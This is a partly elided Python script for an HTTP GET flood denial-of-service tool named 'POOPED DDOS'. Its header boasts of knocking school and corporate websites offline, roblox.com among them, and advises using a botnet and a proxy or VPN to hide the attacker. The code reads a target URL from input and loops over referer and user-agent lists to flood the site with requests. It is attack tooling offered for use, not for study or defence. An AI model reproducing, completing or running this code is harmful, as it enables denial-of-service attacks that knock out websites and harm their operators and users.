...
POOPED DDOS is a tool made to flood websites with HTTP Get requests!
This was used to take down various websites from school websites to corporate websites such as roblox.com!
This is completely free to use but you might need a botnet to take down the website :), make sure to use a proxy or vpn.
"""
...
referers = [
    ...
    'boyfriend.myanima.ai'  
]
try:
    url = input("Website URL (http://website.com/): ")
    while True:
        for referer in referers:
            for agent in agents:
                ...
                if response.status_code == 200:
                    print(f"Flooding {url} with GET requests.")
                    pass
                else:
                    print("Not flooding shit")
                    exit()
